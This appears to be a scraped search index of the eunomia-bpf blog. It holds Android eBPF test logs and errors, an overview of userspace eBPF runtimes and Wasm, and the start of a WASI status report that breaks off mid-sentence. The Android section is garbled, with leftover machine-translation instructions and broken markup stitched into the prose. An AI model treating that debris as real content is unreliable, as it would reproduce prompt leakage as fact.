0xbb01000000000f02000ae7e7e8b7 18446631020132448128 195233125 0 3305 7 2 2 0 443 NetworkService\n07:47:00  0x40020002b4a8bb0136cac8dd0f02000a 0xb4a8bb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195246569 13444 3305 2 1 2 46248 443 NetworkService\n07:47:00  0xf02000affff00000000000000000000 0x1aca06cffff00000000000000000000 18446631019225912320 195383897 0 947 7 2 10 0 80 Thread-11\n07:47:00  0x40010002b4a8bb0136cac8dd0f02000a 0xb4a8bb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195421584 175014 3305 1 4 2 46248 443 NetworkService\n07:47:00  0x40040002b4a8bb0136cac8dd0f02000a 0xb4a8bb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195422361 777 3305 4 5 2 46248 443 NetworkService\n07:47:00  0x400500020000bb0136cac8dd0f02000a 0xbb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195422450 88 3305 5 7 2 46248 443 NetworkService\n07:47:01  0x400700020000bb01000000000f02000a 0xbb01000000000f02000aea2afb8e 18446631020099528128 196321556 0 1315 7 2 2 0 443 ChromiumNet\n\n## Failed Cases\n\n### [fentry-link](https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/fentry-link)\n\nBuilds successfully, but encounters an error when running:\n\n```sh\nlibbpf: prog 'do_unlinkat': failed to attach: Device or resource busy\nlibbpf: prog 'do_unlinkat': failed to auto-attach: -16\nfailed to attach skeleton\".\n</code></pre> <p>Please note that this is a translation of the Markdown text provided.Error: BpfError(\"load and attach ebpf program failed\") <pre><code>### [opensnoop](https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/opensnoop)\n\nSuccessfully built, but encountered an error when running:\n\n```sh\nlibbpf: failed to determine tracepoint 'syscalls/sys_enter_open' perf event ID: No such file or directory\nlibbpf: prog 'tracepoint__syscalls__sys_enter_open': failed to create tracepoint 'syscalls/sys_enter_open' perf event: No such file or directory\nlibbpf: prog 'tracepoint__syscalls__sys_enter_open': failed to auto-attach: -2\nfailed to attach skeleton\nError: BpfError(\"load and attach ebpf program failed\")\n</code></pre></p> <p>After investigation, it was found that the <code>CONFIG_FTRACE_SYSCALLS</code> option was not enabled in the kernel, which caused the tracepoint for syscalls to be unavailable.</p>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#runqlat","title":"runqlat","text":"<p>Encountered an error during the build process:</p> <pre><code>Compiling bpf object...\n$ clang -g -O2 -target bpf -Wno-unknown-attributes -D__TARGET_ARCH_x86 -idirafter /usr/local/include -idirafter /usr/lib/llvm-11/lib/clang/11.0.1/include -idirafter /usr/include/x86_64-linux-gnu -idirafter /usr/include  -I/tmp/eunomia.9fwyJN/include -I/tmp/eunomia.9fwyJN/include/vmlinux/x86  -I/root/eunomia-bpf/examples/bpftools/runqlat -c examples/bpftools/runqlat/runqlat.bpf.temp.c -o examples/bpftools/runqlat/runqlat.bpf.o\n In file included from examples/bpftools/runqlat/runqlat.bpf.temp.c:10:\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:76:9: error: use of unknown builtin '__builtin_preserve_type_info' [-Wimplicit-function-declaration]\n    if (bpf_core_type_exists(struct trace_event_raw_block_rq_completion___x))\n        ^\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:185:2: note: expanded from macro 'bpf_core_type_exists'\n        __builtin_preserve_type_info(*(typeof(type) *)0, BPF_TYPE_EXISTS)\n        ^\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:76:9: note: did you mean '__builtin_preserve_field_info'?\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:185:2: note: expanded from macro 'bpf_core_type_exists'\n        __builtin_preserve_type_info(*(typeof(type) *)0, BPF_TYPE_EXISTS)\".\n```^\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:27:9: note: '__builtin_preserve_field_info' declared here\n    if (bpf_core_field_exists(t-&gt;__state))\n        ^\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:132:2: note: expanded from macro 'bpf_core_field_exists'\n        __builtin_preserve_field_info(___bpf_field_ref(field), BPF_FIELD_EXISTS)\n        ^\nIn file included from examples/bpftools/runqlat/runqlat.bpf.temp.c:10:\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:76:9: warning: indirection of non-volatile null pointer will be deleted, not trap [-Wnull-dereference]\n    if (bpf_core_type_exists(struct trace_event_raw_block_rq_completion___x))\n        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:185:31: note: expanded from macro 'bpf_core_type_exists'\n        __builtin_preserve_type_info(*(typeof(type) *)0, BPF_TYPE_EXISTS)\n                                     ^~~~~~~~~~~~~~~~~~\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:76:9: note: consider using __builtin_trap() or qualifying pointer with 'volatile'\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:185:31: note: expanded from macro 'bpf_core_type_exists'\n        __builtin_preserve_type_info(*(typeof(type) *)0, BPF_TYPE_EXISTS)\n                                     ^\n1 warning and 1 error generated.\n\nthread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: No such file or directory (os error 2)', src/compile_bpf.rs:171:37\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\n</code></pre> <p>The specific cause of the error currently needs further investigation.</p>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#summary","title":"Summary","text":"<p>In the Android shell, it can be observed that the <code>CONFIG_DEBUG_INFO_BTF</code> kernel compilation option is enabled by default. On this basis, the examples provided by the eunomia-bpf project already have some successful cases, such as monitoring the execution of the <code>exec</code> function family and the tcp connection state.</p> <p>For projects that cannot run, the reasons are mainly as follows:</p> <ol> <li>The kernel compilation options do not support the relevant eBPF features;</li> <li>The Linux environment packaged by eadb is relatively weak and lacks necessary dependencies;</li> </ol> <p>Currently, using eBPF tools in the Android system still requires building a complete Linux runtime environment. However, the Android kernel itself has comprehensive support for eBPF. The test this time proves that higher versions of the Android kernel support BTF debugging information and the execution of eBPF programs dependent on CO-RE.Instructions: Translate the following Chinese text to English  while maintaining the original formatting: \"Android system eBPF tool development requires the addition of official new features. At present, it seems that using eBPF tools directly through Android apps requires a lot of work. Additionally, since eBPF tools require root permissions, ordinary Android users will face many difficulties.</p>"},{"location":"blog/2022/09/11/running-the-ecli-on-android-13/#references","title":"References","text":"<p>Share on  Share on </p> <ol> <li> <p>https://source.android.google.cn/docs/core/architecture/kernel/bpf \u21a9</p> </li> <li> <p>https://mp.weixin.qq.com/s/mul4n5D3nXThjxuHV7GpMA \u21a9</p> </li> <li> <p>https://blog.seeflower.dev/archives/138/\". format: Return only the translated content, not including the original text.\u00a0\u21a9</p> </li> </ol>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/","title":"Userspace eBPF Runtimes: Overview and Applications","text":"<p>Yusheng Zheng</p> <p>In this blog post, we'll dive into the world of eBPF in userspace. While many are familiar with kernel-based eBPF, userspace eBPF runtimes have been making significant strides and offer compelling use cases. We will also compare userspace eBPF runtimes with Wasm runtimes, another popular technology in the cloud-native and edge computing landscape. Among these, we're excited to introduce bpftime. Powered by an LLVM <code>JIT/AOT</code> backend, our benchmarks suggest that bpftime stands out as one of the fastest userspace eBPF runtimes available.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#introduction-to-ebpf","title":"Introduction to eBPF","text":""},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#what-is-ebpf","title":"What is eBPF?","text":"<p>eBPF, which stands for \"extended Berkeley Packet Filter,\" is a revolutionary technology that facilitates the dynamic tracing and monitoring of kernel operations without modifying kernel source code or rebooting the system. Originally designed for network packet filtering, eBPF has evolved to support a wide range of applications, from performance analysis to security, making it a versatile tool in a system administrator's arsenal.</p> <p>The story of eBPF begins with the Berkeley Packet Filter (BPF), introduced in the early 1990s as a way to filter and capture network packets efficiently. Over the years, BPF proved to be an invaluable asset, but there was room for improvement. eBPF emerged as an advanced iteration of BPF, equipped with a richer instruction set and the capability to interact with kernel data structures directly.</p> <p>The Linux kernel adopted eBPF around 2014, and since then, its popularity and adoption have skyrocketed. Key contributors to the Linux kernel worked diligently to evolve eBPF from a simple packet filter to a generic and powerful bytecode engine.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#its-significance-in-modern-computing-and-network-solutions","title":"Its significance in modern computing and network solutions","text":"<p>In today's complex computing environments, the need for real-time data and insights is paramount. eBPF shines in this regard, allowing developers and administrators to introspect and modify system behaviors on the fly.</p> <p>Given its dynamic nature, eBPF has become a cornerstone of modern networking solutions. It enables fine-grained traffic control, load balancing, and security enforcement at the kernel level, ensuring optimal performance and security. Furthermore, in the realm of observability, eBPF provides granular insights into system calls, hardware events, and more, facilitating proactive problem detection and resolution.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#ebpf-from-kernel-runtime-to-userspace-runtime","title":"eBPF: from kernel runtime to userspace runtime","text":"<p>While the initial design of eBPF was deeply embedded within the kernel, the demand for similar functionality in userspace applications led to the evolution of userspace eBPF runtimes. These runtimes allow developers to leverage eBPF's capabilities outside the kernel, expanding its utility and applicability. Userspace eBPF runtimes make it feasible to apply eBPF's prowess to a broader set of applications, from custom network protocols to novel security solutions, further cementing eBPF's role as a transformative technology in the computing landscape.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#userspace-ebpf-runtimes-and-their-role","title":"Userspace eBPF Runtimes and Their Role","text":""},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#what-is-a-userspace-ebpf-runtime","title":"What is a userspace eBPF runtime?","text":"<p>A userspace eBPF runtime provides a platform outside of the kernel to run eBPF programs. While one of eBPF's standout attributes is its capability to execute code within the kernel space, offering rapid observability and data aggregation, there are scenarios where having a userspace alternative becomes valuable. These userspace runtimes extend the reach of eBPF's versatility to areas beyond kernel integrations and often serve as experimental grounds, debugging tools, or frameworks for specific use cases.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#introduction-to-specific-runtimes","title":"Introduction to specific runtimes","text":""},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#ubpf","title":"ubpf","text":"<p>uBPF was among the early attempts to bring eBPF to the userspace. Conceived primarily as a proof-of-concept, it served as a user-space interpretation of an eBPF interpreter combined with an x86_64 and arm64 JIT. Despite its origins as an early prototype, uBPF garnered attention and was utilized as a foundation for high-performance networking projects such as DPDK and Oko. Its non-GPL licensing (Apache) makes it favorable for a wide range of projects, inclusive of proprietary ones. However, as of recent, uBPF is catching up with kernel developments, particularly with contributions from Microsoft for its eBPF Windows implementation. However, develop ubpf and rbpf programs may require a specific toolchain, which may be a barrier for some users. ubpf only have a limited hashmap implementation, which may not be enough for some users.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#rbpf","title":"rbpf","text":"<p>rbpf is heavily influenced by uBPF but with an emphasis on Rust, a language renowned for its memory safety guarantees. The creation of rbpf was driven by a desire to explore the intersections of eBPF and Rust. While not as widespread in adoption, notable users of rbpf include the Solana team, employing it for blockchain tools with eBPF-driven smart contracts. One of rbpf's advantages lies in its licensing (MIT), allowing for broad reuse across various projects. rbpf also lacks eBPF map support, and only has JIT support for x86_64.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#bpftime","title":"bpftime","text":"<p>Built atop LLVM JIT/AOT, bpftime is a cutting-edge, high-performance eBPF runtime designed exclusively for userspace operations. It stands out with its rapid Uprobe capabilities and Syscall hooks, notably outperforming the kernel Uprobe by a tenfold margin. Additionally, bpftime offers programmatic syscall hooking, shared memory maps, and compatibility with familiar toolchains like libbpf and clang. Its design addresses some kernel eBPF limitations and outpaces plugin systems like the Wasm runtime in certain aspects.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#why-is-having-a-userspace-version-of-ebpf-interesting","title":"Why is Having a Userspace Version of eBPF Interesting?","text":"<p>eBPF, while renowned for its kernel-space operations, has observed a growing interest in its userspace adaptations. Here's why migrating eBPF to userspace is capturing the attention of technologists:</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#enhanced-performance","title":"Enhanced Performance","text":"<p>In kernel operations, the Uprobe component of eBPF is often beleaguered by performance inefficiencies, primarily due to the overheads introduced by context switches. In latency-sensitive applications, these inefficiencies can be detrimental, affecting real-time monitoring and data processing. By transitioning to userspace, eBPF can bypass these context switch related delays, leading to a more optimized performance. Runtimes like <code>bpftime</code> exemplify this, offering substantial performance improvements compared to their kernel counterparts.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#flexibility-and-integration","title":"Flexibility and Integration","text":"<p>Userspace eBPF runtimes champion flexibility. Unlike some alternatives, such as the Wasm runtime, which might necessitate manual integrations, userspace eBPF provides the boon of automatic instrumentation. This means they can be seamlessly introduced into running processes without the need for cumbersome restarts or recompilations, ensuring smoother operational flows.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#augmented-security","title":"Augmented Security","text":"<p>Operating in kernel mode, eBPF programs require root access, which can inadvertently expand the attack surface, making systems susceptible to vulnerabilities like container escapes or even potential kernel exploits. Userspace runtimes, however, operate outside this high-risk zone. By functioning in userspace, they demand fewer privileges, inherently reducing the potential avenues for security breaches.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#debugging-and-licensing-flexibility","title":"Debugging and Licensing Flexibility","text":"<p>One of the innate advantages of userspace eBPF runtimes is the ease with which developers can debug their code. The accessibility to integrate breakpoints in a userspace interpreter is a marked advantage over the relatively constrained debugging capabilities in kernel eBPF. Additionally, the licensing flexibility of userspace eBPF runtimes, typically offered under licenses like Apache or MIT, ensures they can be paired with a diverse range of projects, including proprietary ones, sidestepping the GPL constraints associated with kernel code.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#use-cases-existing-ebpf-userspace-applications","title":"Use Cases: Existing eBPF Userspace Applications","text":"<p>Userspace eBPF is being utilized in a number of notable projects, each harnessing the unique capabilities of eBPF to enhance their functionalities. Here's how Userspace eBPF is currently utilized in various applications:</p> <ol> <li>Oko:</li> </ol> <p>Oko is an extension of Open vSwitch-DPDK that provides runtime extension with BPF programs. It enables the use of BPF programs to process packets in userspace, providing flexible packet processing and facilitating the integration of Open vSwitch with other systems.</p> <ol> <li>DPDK eBPF Support:</li> </ol> <p>The DPDK (Data Plane Development Kit) eBPF support facilitates fast packet processing by enabling the use of eBPF programs in userspace, which can be loaded and run to analyze network packets. This enhances the flexibility and programmability of network applications without requiring kernel modifications.</p> <ol> <li>Solana:</li> </ol> <p>Solana utilizes eBPF to implement a JIT (Just-In-Time) compiler, which is essential for executing smart contracts on its blockchain network. The use of eBPF ensures safety, performance, and architecture agnosticism, thus allowing efficient execution of smart contracts across validator nodes on the Solana blockchain.</p> <ol> <li>eBPF for Windows (Work-In-Progress):</li> </ol> <p>This project is aimed at bringing the eBPF toolchains and APIs familiar in the Linux ecosystem to Windows, allowing existing eBPF toolchains to be utilized on top of Windows. This demonstrates a promising endeavor to extend the capabilities of eBPF beyond Linux, although it's still a work in progress.</p> <p>The benefits of using eBPF in these applications include:</p> <ul> <li>Flexibility: eBPF provides a flexible framework for running programs in the kernel or userspace, enabling developers to extend the functionality of existing systems without modifying their core code.</li> <li>Performance: By allowing JIT compilation and efficient packet processing, eBPF can significantly enhance the performance of network applications and blockchain smart contract execution.</li> <li>Safety and Security: The eBPF framework provides mechanisms for verifying the safety properties of programs before execution, thus ensuring the integrity and security of the systems it is integrated with.</li> <li>Cross-platform Capability: The architecture-agnostic nature of eBPF instruction set enables cross-platform compatibility, as seen in projects like Solana and the work-in-progress eBPF for Windows.</li> </ul> <p>These attributes make eBPF a powerful tool for augmenting a variety of applications, ranging from network processing to blockchain smart contract execution, and beyond. There are also some papers that discuss the use of eBPF in userspace:</p> <ol> <li>RapidPatch: Firmware Hotpatching for Real-Time Embedded Devices:</li> </ol> <p>This paper introduces a new hotpatching framework named RapidPatch, which is designed to facilitate the propagation of patches by installing generic patches on heterogeneous embedded devices without disrupting other tasks running on them.</p> <p>Furthermore, RapidPatch proposes two types of eBPF patches for different types of vulnerabilities and develops an eBPF patch verifier to ensure patch safety.</p> <ol> <li>Femto-Containers: Lightweight Virtualization and Fault Isolation For Small Software Functions on Low-Power IoT Microcontrollers:</li> </ol> <p>This paper presents Femto-Containers, a novel framework that enables the secure deployment, execution, and isolation of small virtual software functions on low-power IoT devices over a network.</p> <p>The framework is implemented and provided in RIOT, a popular open source IoT operating system, with an emphasis on secure deployment, execution, and isolation of small virtual software functions on low-power IoT devices, over the network.</p> <p>The paper discusses the implementation of a Femto-Container hosting engine integrated within a common low-power IoT operating system (RIOT), enhancing it with the ability to start, update, or terminate Femto-Containers on demand, securely over a standard IPv6/6LoWPAN network.</p> <p>These papers delve into pertinent advancements concerning firmware patching and lightweight virtualization, demonstrating innovations that address critical challenges in the domains of real-time embedded systems and low-power IoT microcontrollers respectively.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#userspace-ebpf-runtime-vs-wasm-runtime","title":"Userspace eBPF Runtime vs Wasm Runtime","text":"<p>In the evolving landscape of cloud-native and edge computing, both eBPF (extended Berkeley Packet Filter) and Wasm (WebAssembly) have emerged as powerful tools. However, they come with their own set of design principles and trade-offs.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#a-comparison-of-ebpf-and-wasm","title":"A Comparison of eBPF and Wasm","text":"<p>eBPF:</p> <ul> <li>Philosophy: eBPF prioritizes performance, often making it the choice for real-time kernel operations and high-throughput networking tasks.</li> <li>Security: While performance takes the forefront, security in eBPF is ensured through the use of a verifier, ensuring that all programs are safe to run without causing kernel panics or infinite loops.</li> </ul> <p>Wasm:</p> <ul> <li>Philosophy: Originally designed for the web, Wasm places a higher emphasis on portability and security. It was conceived to execute code nearly as fast as running native machine code and ensures safety in hostile environments like web browsers.</li> <li>Security: The primary security model for Wasm revolves around Software Fault Isolation (SFI). This model guarantees safe execution by enforcing sandboxing, even though this can introduce some runtime overheads.</li> </ul> <p>For both technologies, reliance on underlying libraries for complex operations is paramount. For instance, Wasm leans on libraries like <code>Wasi-nn</code> for neural network operations. However, when interfacing with such external APIs, especially in Wasm's context, there's a need for additional validation and runtime checks, sometimes leading to substantial performance costs. eBPF, when embedded within the host, capitalizes on its verifier to ensure code safety, offering a more performance-centric approach.</p> <p>On the language support front, while eBPF's niche and specialized nature mean limited language support, Wasm boasts a broader language portfolio due to its origin and design for the web.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#conclusion","title":"Conclusion","text":"<p>Userspace eBPF runtimes are an exciting development that expands the capabilities of eBPF beyond the kernel. As highlighted in this post, they offer compelling benefits like enhanced performance, flexibility, and security compared to kernel-based eBPF. Runtimes like bpftime demonstrate the potential for substantial speedups, even outperforming alternatives like Wasm runtimes in certain dimensions like low-level performance.</p> <p>With innovative frameworks like RapidPatch and Femto-Containers utilizing userspace eBPF for patching and lightweight virtualization respectively, we are witnessing pioneering use cases that address critical challenges in embedded systems and IoT domains. As eBPF continues its evolution in userspace, we can expect even more creative applications that augment everything from smart contracts to network protocols.</p> <p>While alternatives like Wasm certainly have their place with a strong emphasis on web portability and security, eBPF's specialized nature gives it an edge for performance-critical tasks. Ultimately, the choice between the two depends on the specific use case and priorities. As they continue to evolve, userspace eBPF runtimes are cementing their position as an indispensable part of the cloud-native technology stack, offering an unparalleled combination of safety, efficiency and innovation.</p> <p>We encourage our readers to dive deep into the world of userspace eBPF, starting with our bpftime GitHub repository: https://github.com/eunomia-bpf/bpftime Contributions, feedback, or simply using the tool can further the cause and provide invaluable insights to the community.</p> <p>If you use our project in research, please cite our repo.</p>"},{"location":"blog/2024/01/11/userspace-ebpf-runtimes-overview-and-applications/#reference","title":"reference","text":"<ol> <li>bpftime: https://github.com/eunomia-bpf/bpftime</li> <li>ubpf: https://github.com/iovisor/ubpf</li> <li>rbpf: https://github.com/qmonnet/rbpf</li> <li>Oko: https://github.com/Orange-OpenSource/Oko</li> <li>RapidPatch: Firmware Hotpatching for Real-Time Embedded Devices: https://www.usenix.org/conference/usenixsecurity22/presentation/he-yi</li> <li>DPDK eBPF Support: https://www.dpdk.org/wp-content/uploads/sites/35/2018/10/pm-07-DPDK-BPFu6.pdf</li> <li>Solana: https://solana.com/</li> <li>eBPF for Windows (Work-In-Progress): https://github.com/microsoft/ebpf-for-windows</li> <li>Femto-Containers: Lightweight Virtualization and Fault Isolation For Small Software Functions on Low-Power IoT Microcontrollers: https://arxiv.org/abs/2210.03432</li> </ol> <p>Share on  Share on </p>"},{"location":"blog/2025/02/16/wasi-and-the-webassembly-component-model-current-status/","title":"WASI and the WebAssembly Component Model: Current Status","text":"<p>WebAssembly (WASM) has evolved from a browser-based technology into a promising runtime for server and embedded applications. Key to this evolution are the WebAssembly System Interface (WASI) \u2013 a standardized set of syscalls for WASM outside the browser \u2013 and the emerging Component Model, which enables modular, language-agnostic composition of WebAssembly modules. This report analyzes the current status of WASI (including its major runtimes like Wasmtime and Wasmer) and the Component Model, focusing on the technical limitations that impede adoption. We draw from official proposals, runtime issue trackers, academic studies, and industry experiences to highlight critical gaps, unresolved bugs, and feature requests. Case studies illustrate how these challenges block real-world use cases, and we conclude with recommendations for improving WebAssembly\u2019s performance, security, and integrability with host environments.</p>"},{"location":"blog/2025/02/16/wasi-and-the-webassembly-component-model-current-status/#overview","title":"Overview","text":"<p>WASI Overview: WASI is a modular system interface that gives WebAssembly modules controlled access to operating system features such as files, clocks, and networking. It was created to extend WebAssembly beyond browsers, where vanilla WASM had no direct OS access due to sandboxing (1) (1). Early versions (WASI \u201csnapshot preview1\u201d) provided basic POSIX-like functions (e.g. file IO, environment vars, random) but notably lacked capabilities like networking and threading. In early 2024, the Bytecode Alliance released WASI Preview 2 (also called WASI 0.2), a major iteration that incorporates the Component Model and expands available APIs (2) (2). WASI 0.2 introduced \u201cworlds\u201d \u2013 cohesive sets of interfaces for specific domains. For example:</p> <ul> <li>wasi-cli for command-line apps (arguments, environment) (2),  </li> <li>wasi-http for outbound HTTP requests (2),  </li> <li>wasi-filesystem for files and directories (2),  </li> <li>wasi-sockets for TCP/UDP socket support (2), and others like clocks and random number generation (2).</li> </ul> <p>This broadened API surface addresses some long-standing gaps (e.g. networking, which Preview1 lacked). The next WASI release (0.3 or \u201cPreview 3\u201d) due in 2025 is expected to add native asynchronous I/O support via the Component Model and upgrade existing APIs to use async primitives (2). Full WASI 1.0 stabilization will follow once these pieces mature (2).</p> <p>Component Model Overview: The WebAssembly Component Model is a newer proposal (currently in draft) that standardizes how larger applications can be built from smaller WebAssembly components. It builds on Interface Types (now embodied as WIT, the WebAssembly Interface Definition Language) to allow high-level data (strings, structured records, etc.) to be passed between modules, rather than only integers and linear memory references. In practical terms, the Component Model lets developers treat WebAssembly modules like \u201cLEGO bricks\u201d that plug together securely and interoperably (3) (3). WASI 0.2 is tightly coupled to the Component Model: interfaces are defined in WIT and can be assembled into components that import/export those interfaces. This enables dynamic linking and language interop \u2013 for example, a C-written module could call a Rust-written module\u2019s functions if both conform to the same interface contract. Early implementations of the Component Model exist (e.g. in Wasmtime), but it is still in the proposal phase (Phase 2/3 in the W3C process) and not yet supported in web browsers (4: Timeline for the Component Model and async questions #316 - GitHub). As of late 2024, Wasmtime was the first major runtime with full support for loading Component Model modules (WASM components) and the WASI 0.2 APIs, while others are catching up (5). This means developers can experiment with multi-module applications in Wasmtime today, using the new WIT-based interfaces, though cross-runtime portability will improve as the spec stabilizes.</p> <p>Major WASI Runtimes: Several WebAssembly runtimes implement WASI to varying degrees, each with their own focus:</p> <ul> <li>Wasmtime (Bytecode Alliance) \u2013 A fast, secure runtime in Rust that prioritizes standards compliance. It quickly integrated WASI Preview 2 support (5: About Wasm and WASI, I'll try ( and probably fail ) to escape the HN ...) and provides both JIT and ahead-of-time (AOT) compilation. Wasmtime also supports experimental features like asynchronous host calls (via Rust <code>async</code>/<code>await</code> integration) to avoid blocking the runtime thread during host IO (6). Recent releases (e.g. Wasmtime v25) added full WASI 0.2.1 support and other improvements (7: Wasmtime v25.0 brings extended constants, WASI 0.2.1, user stack ...).</li> <li>Wasmer \u2013 Another popular Rust-based runtime, emphasizing ease of embedding and cross-language bindings. Wasmer supports WASI Preview1 fully and has added Preview2 support in its 3.x/4.x releases, though historically it lagged slightly behind Wasmtime on new proposals. Wasmer introduced \u201cWASIX,\u201d a fork of WASI Preview1 with additional non-standard syscalls (like <code>fork()</code>, extended networking, etc.) to meet user needs while the official WASI progressed slowly (8) (8). This highlights both Wasmer\u2019s innovation and the ecosystem\u2019s fragmentation risk (discussed later). Wasmer plans to align with the Component Model and is working on async support, leveraging the browser\u2019s upcoming WASM Promise integration to maintain parity between server and browser environments (6) (6).</li> <li>WasmEdge \u2013 A CNCF project (formerly SSVM) focused on cloud and edge use-cases. WasmEdge supports WASI (Preview1) and went further by implementing non-blocking sockets and HTTP as extensions before these were standardized (9: WasmEdge Features | WasmEdge Developer Guides) (10). Performance is a key goal; it uses optimizations like AOT compilation. However, as of early 2023, WasmEdge had not yet integrated the new Component Model or Preview2 APIs, sticking to its own extensions for needed functionality (11) (11).</li> <li>WAMR (WebAssembly Micro Runtime) \u2013 A lightweight interpreter/AOT runtime optimized for embedded devices. WAMR implements WASI Preview1 (basic filesystem, args, etc.) but often omits heavy features. Notably, WAMR showed very fast startup and certain IO performance in tests (12), though it lacks support for multi-threading and other advanced proposals, focusing on minimal footprint.</li> <li>Node.js \u2013 Node introduced a built-in <code>node:wasi</code> module to run WASI modules in a Node process. However, this remains experimental and behind flags (e.g. <code>--experimental-wasi-unstable-preview1</code> for Preview1 support) (11). Moreover, Node\u2019s WASI has known security limitations: it does not implement the full sandboxing guarantees of WASI (for instance, file system access isn\u2019t strictly confined to pre-opened directories) (13). The Node docs explicitly warn that it \u201cdoes not provide the comprehensive file system security\u201d of other WASI runtimes (14). In fact, Node\u2019s maintainers caution users not to run untrusted WASM code using <code>node:wasi</code> because the sandbox may be bypassable (13). This limits Node\u2019s usefulness for secure isolation, though it\u2019s fine for trusted code. The community has responded by instead embedding Wasmtime or Wasmer in Node when strong isolation is required (13) (13). Node has yet to mark WASI support stable (15: Request: mark WASI as stable \u00b7 Issue #46254 \u00b7 nodejs/node - GitHub).</li> <li>Other \u2013 Browsers themselves do not natively support WASI (since it\u2019s designed for non-web). Projects like wasi-js and wasm-polyfills exist to simulate WASI in a browser by shimming calls to JS APIs (16: swiftwasm/uwasi: Micro modularized WASI runtime for JavaScript), but these are incomplete and often limited by browser security (e.g. no raw socket access in browser). Some language-specific runtimes (like wasi-libc for C or wazero in Go) implement WASI to allow running WASM code within those ecosystems.</li> </ul> <p>In summary, the ecosystem is in flux: Wasmtime leads on implementing the latest standards (Preview2, components, threads, etc.), Wasmer/WasmEdge have bridged gaps with custom extensions, and Node and others are still stabilizing their offerings. This uneven support across runtimes is itself an adoption challenge \u2013 as a CNCF survey noted, inconsistencies between runtimes and language toolchains are \u201camongst the biggest barriers facing Wasm developers\u201d (17) (17). Next, we delve into specific technical limitations and gaps in WASI and the Component Model that underlie these challenges.</p>"},{"location":"blog/2025/02/16/wasi-and-the-webassembly-component-model-current-status/#key-technical-limitations-in-wasi","title":"Key Technical Limitations in WASI","text":"<p>Despite significant progress, today\u2019s WASI and related proposals still have important limitations. These gaps can hamper real-world use cases and require workarounds or non-standard extensions. Below we outline the most prominent technical issues:</p> <p>1. Single-Threaded Execution: WebAssembly (and by extension WASI) began as a single-threaded sandbox. There is a threads proposal for WASM (enabling multithreading with shared memory), but it\u2019s not yet universally deployed. Consequently, WASI programs cannot spawn or use multiple CPU threads by default. This has a direct impact on performance for compute or I/O heavy workloads on multi-core systems. For example, an academic evaluation of WASM \u201cmicro-container\u201d performance found that a WASI-based server could only utilize one CPU core and saw severely reduced throughput compared to a native container because \u201cthe Wasm container does not support multi-threading\u201d () (). The study concludes that the \u201clack of multi-threading severely limits its use cases\u201d and that current WASM containers \u201cdo not match the performance of traditional Linux containers\u201d for multi-core workloads (). There are experimental efforts to bring threads to WASI (e.g. the wasi-threads proposal and libraries () ()), but as of 2024 these are not part of the official WASI Preview2 and not supported in mainstream runtimes. This is a critical gap for server-side adoption, where multi-threading is the norm for scalability. Until threads are standardized and implemented (likely requiring the WebAssembly threads proposal to reach maturity), use of WASM in multi-core server apps will either be limited to single-core performance or rely on heavier-weight strategies (like running multiple WASM instances behind a load balancer).</p> <p>2. Incomplete Networking and System Services: The initial WASI snapshot (preview1) deliberately omitted certain system functions, most glaringly network socket creation. It provided APIs to operate on already-opened sockets or file descriptors, but no way to open a listening socket or initiate a connection on its own (10). This made it \u201cimpossible to support some of the most popular features\u201d \u2013 a clear example being that one could not write a pure-WASI HTTP server in Go or Rust because there was no way to call <code>socket()</code> or <code>bind()</code> (10). Developers worked around this in non-standard ways: Wasmer and WasmEdge added custom extensions for socket creation outside of the standard (often referred to as WASI-ext or WASIX) (10), and community libraries like <code>stealthrocket/net</code> for Go provided shims to call those host-specific APIs (10). The good news is that WASI Preview2 has introduced wasi-sockets, providing standard APIs for TCP/UDP and making networking a first-class citizen (2). However, using these new APIs requires the Component Model and preview2 ecosystem \u2013 existing Preview1 binaries remain stuck without networking unless 